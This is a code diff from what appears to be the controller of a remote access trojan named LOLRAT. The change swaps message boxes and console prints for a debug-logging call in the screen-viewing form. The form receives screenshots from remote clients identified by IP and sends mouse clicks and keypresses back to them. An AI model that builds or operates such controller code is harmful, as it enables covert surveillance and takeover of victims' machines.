@@ -53,6 +53,7 @@ namespace LOLRAT_C2
             if (receivedImageSS == null)
             {
                 MessageBox.Show("Received image is null. Ensure that the image is properly received.");
+                mainInstance.DebugOutput("Received image is null. Ensure that the image is properly received.");
                 return;
             }
 
@@ -64,6 +65,7 @@ namespace LOLRAT_C2
             if (pbSS == null)
             {
                 MessageBox.Show("PictureBox is null. Ensure that it is properly initialized.");
+                mainInstance.DebugOutput("PictureBox is null. Ensure that it is properly initialized.");
                 return;
             }
 
@@ -71,6 +73,7 @@ namespace LOLRAT_C2
             if (pbSS.Image == null)
             {
                 MessageBox.Show("PictureBox Image is null. Ensure that it is properly set.");
+                mainInstance.DebugOutput("PictureBox Image is null. Ensure that it is properly set.");
                 return;
             }
 
@@ -82,6 +85,7 @@ namespace LOLRAT_C2
             {
                 mainInstance.ExecuteMouseClick(imageX, imageY, "left", currentViewingIP);
                 //MessageBox.Show($"Clicked on image at coordinates X: {imageX}, Y: {imageY}");
+                mainInstance.DebugOutput($"Clicked on image at coordinates X: {imageX}, Y: {imageY}");
             }
         }
 
@@ -94,7 +98,8 @@ namespace LOLRAT_C2
             if (keyboardControlEnabled)
             {
                 mainInstance.ExecuteKeyboardClick(keyDataString, currentViewingIP);
-                MessageBox.Show($"Pressed key: {keyDataString}");
+                //MessageBox.Show($"Pressed key: {keyDataString}");
+                mainInstance.DebugOutput($"Pressed key: {keyDataString}");
             }
             return base.ProcessCmdKey(ref msg, keyData); // Call the base method
         }
@@ -168,13 +173,13 @@ namespace LOLRAT_C2
                                     else // If the current IP is not selected in cbSSIPS
                                     {
                                         // Display the received image in the PictureBox (Invoke on the main thread)
-                                        Console.WriteLine("Received image from " + clientAddress + " but it is not selected in cbSSIPS. Not displaying.");
+                                        mainInstance.DebugOutput("Received image from " + clientAddress + " but it is not selected in cbSSIPS. Not displaying.");
                                     }
                                 }
                             }
                             else
                             {
-                                Console.WriteLine("Invalid image size received: " + imageSize);
+                                mainInstance.DebugOutput("Invalid image size received: " + imageSize);
                             }
                         }
                     }
@@ -182,7 +187,7 @@ namespace LOLRAT_C2
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.ToString());
+                mainInstance.DebugOutput(ex.ToString());
             }
         }
 
